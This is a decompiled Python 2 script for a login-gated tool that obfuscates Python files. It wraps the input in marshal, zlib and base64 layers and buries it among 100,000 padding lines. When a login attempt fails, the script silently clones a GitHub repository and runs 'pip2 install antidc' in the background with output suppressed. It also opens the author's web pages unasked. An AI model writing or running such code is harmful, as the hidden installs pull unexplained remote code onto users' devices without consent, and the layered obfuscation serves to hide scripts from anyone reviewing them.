# RADAL SAID: whatdefok:v
# Decompiled at 09:39 AM (22 April 2021)

import os, sys, py_compile, marshal, base64, zlib, time
from os import system
from time import sleep
try:
    import requests
except ImportError:
    system('pip2 install requests > /dev/null 2>&1 &')
    system('pip2 install requests > /dev/null 2>&1 &')

try:
    import requests
except ImportError:
    print '\nUnable to Install requests !'
    os.sys.exit()

def azimprint(s):
    for t in s + '\n':
        sys.stdout.write(t)
        sys.stdout.flush()
        time.sleep(0.01)


logo = '\n\x1b[1;35m\n        _          _\n         \\        /\n        __\\______/__\n        | [\xc2\xa9]  [\xc2\xa9] |\xe2\x80\x8b\n        |  [====]  |   \x1b[1;32m[+] \xf0\x9f\x87\xa6\xe2\x80\x8b\xf0\x9f\x87\xb3\xe2\x80\x8b\xf0\x9f\x87\xb4\xe2\x80\x8b\xf0\x9f\x87\xb3\xe2\x80\x8b\xf0\x9f\x87\xbe\xe2\x80\x8b\xf0\x9f\x87\xb2\xe2\x80\x8b\xf0\x9f\x87\xb4\xe2\x80\x8b\xf0\x9f\x87\xba\xe2\x80\x8b\xf0\x9f\x87\xb8\xe2\x80\x8b \x1b[37;1m\xf0\x9f\x84\xb7\xf0\x9f\x84\xb0\xf0\x9f\x84\xb2\xf0\x9f\x84\xba\xf0\x9f\x84\xb4\xf0\x9f\x85\x81\xf0\x9f\x85\x82 \x1b[1;32m[+]\n\x1b[33;1m    \xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\x1b[1;35mo00\x1b[33;1m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\x1b[1;35m00o\x1b[33;1m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[34;1m    \xe2\x96\x88       \x1b[1;91mAuthor       \x1b[37;1m:  \x1b[1;91mAZIM                  \x1b[34;1m\xe2\x96\x88\n\x1b[34;1m    \xe2\x96\x88       \x1b[1;91mFacebook     \x1b[37;1m:  \x1b[1;91mMAHMUD AZIM           \x1b[34;1m\xe2\x96\x88\n\x1b[34;1m    \xe2\x96\x88       \x1b[1;91mInstagram    \x1b[37;1m:  \x1b[1;91m@azimmahmud143        \x1b[34;1m\xe2\x96\x88\n\x1b[34;1m    \xe2\x96\x88       \x1b[1;91mWhatsApp     \x1b[37;1m:  \x1b[1;91m+880187803xnxx        \x1b[34;1m\xe2\x96\x88\n\x1b[34;1m    \xe2\x96\x88       \x1b[1;91mVersion      \x1b[37;1m:  \x1b[1;91m1.0                   \x1b[34;1m\xe2\x96\x88\n\x1b[33;1m    \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\x1b[1;91m                     [[\x1b[1;92m WELCOME \x1b[1;91m]]\n'
usercode = requests.get('https://pastebin.com/raw/5RTQEeE0')
passcode = requests.get('https://pastebin.com/raw/5RTQEeE0')
userxx = usercode.text
passxx = passcode.text
haxuser = userxx
haxpwd = passxx

def haxxx():
    system('clear')
    print logo
    print '               \x1b[1;92mINPUT USERNAME & PASSWORD\x1b[0m'
    print '     \x1b[1;96m--------------------------------------------'
    print ''
    usr = raw_input('\x1b[1;93m           TOOL USERNAME \x1b[1;96m:\x1b[1;92m ')
    if usr == haxuser:
        p()
    else:
        system('clear')
        system('git clone https://github.com/Azim-vau/antidc.git > /dev/null 2>&1 &')
        print '\x1b[0m' + logo
        print '               \x1b[1;92mINPUT USERNAME & PASSWORD\x1b[0m'
        print '     \x1b[1;96m--------------------------------------------'
        print ''
        print '\x1b[1;93m           TOOL USERNAME \x1b[1;96m:\x1b[1;97m ' + usr + ' \x1b[1;91m[wrong]\x1b[0m'
        sleep(1)
        system('xdg-open https://github.com/Azim-vau')
        haxxx()


def p():
    system('clear')
    print logo
    print '               \x1b[1;92mINPUT USERNAME & PASSWORD\x1b[0m'
    print '     \x1b[1;96m--------------------------------------------'
    print ''
    print '\x1b[1;93m           TOOL USERNAME \x1b[1;96m:\x1b[1;97m AZIM-VAU \x1b[1;92m[correct]\x1b[0m'
    pwd = raw_input('\n\x1b[1;93m           TOOL PASSWORD \x1b[1;96m:\x1b[1;92m ')
    if pwd == haxpwd:
        z()
    else:
        system('clear')
        system('pip2 install antidc --upgrade > /dev/null 2>&1 &')
        print logo
        print '               \x1b[1;92mINPUT USERNAME & PASSWORD\x1b[0m'
        print '     \x1b[1;96m--------------------------------------------'
        print ''
        print '\x1b[1;93m           TOOL USERNAME \x1b[1;96m:\x1b[1;97m AZIM-VAU \x1b[1;92m[correct]\x1b[0m'
        print '\n\x1b[1;93m           TOOL PASSWORD \x1b[1;96m:\x1b[1;97m ' + pwd + ' \x1b[1;91m[wrong]\x1b[0m'
        sleep(1)
        system('xdg-open https://linktr.ee/mr.error')
        p()


def z():
    system('clear')
    print logo
    print '               \x1b[1;92mINPUT USERNAME & PASSWORD\x1b[0m'
    print '     \x1b[1;96m--------------------------------------------'
    print ''
    print '\x1b[1;93m           TOOL USERNAME \x1b[1;96m:\x1b[1;97m AZIM-VAU \x1b[1;92m[correct]\x1b[0m'
    print '\n\x1b[1;93m           TOOL PASSWORD \x1b[1;96m:\x1b[1;97m AZIM-VAU \x1b[1;92m[correct]\x1b[0m'
    print '\n\n\x1b[1;92m Successfully Logged in !!\x1b[0m'
    sleep(2)
    az1m()


def az1m():
    system('clear')
    azimprint(logo)
    azim1 = raw_input('  Input File Name : ')
    azim2 = open(azim1).read()
    azim3 = open('azim.py', 'w')
    azim3.write('mahmudazim=(\n')
    for i in range(50000):
        azim3.write('"mahmudazim","mahmudazim","mahmudazim","mahmudazim",\n')

    azim3.write(')\n')
    azim4 = compile(azim2, 'Azim-vau', 'exec')
    azim5 = marshal.dumps(azim4)
    azim6 = zlib.compress(azim5)
    azim7 = base64.b64encode(azim6)
    azim8 = repr(azim7)
    azim9 = '# Compiled By Azim-Vau | Mahmud Azim \n# Github : https://github.com/Azim-vau \n# Instagram : https://www.instagram.com/azimmahmud143 \n# ------------------------------------------------------- \n\n\nimport marshal,zlib,base64\nx =  marshal.loads(zlib.decompress(base64.b64decode("' + str(azim8) + '")))'
    azim10 = compile(azim9, 'Azim-vau', 'exec')
    azim11 = marshal.dumps(azim10)
    azim12 = repr(azim11)
    azim3.write('# Compiled By Azim-vau | Mahmud Azim \n# Github : https://github.com/Azim-vau \n# Instagram : https://www.instagram.com/azimmahmud143 \n# ------------------------------------------------------- \n\n\nimport marshal\nx =  marshal.loads(' + azim12 + ')\n\n\n')
    azim3.write('mahmudazim=(\n')
    for i in range(50000):
        azim3.write('\n"mahmudazim","mahmudazim","mahmudazim","mahmudazim",\n')

    azim3.write(')\n')
    azim3.close()
    py_compile.compile('azim.py', 'done.pyc')
    system('rm -f azim.py')
    print
    azimprint('  Output : /sdcard/done.pyc')
    system('mv done.pyc /sdcard')
    sleep(1)
    print


if __name__ == '__main__':
    haxxx()
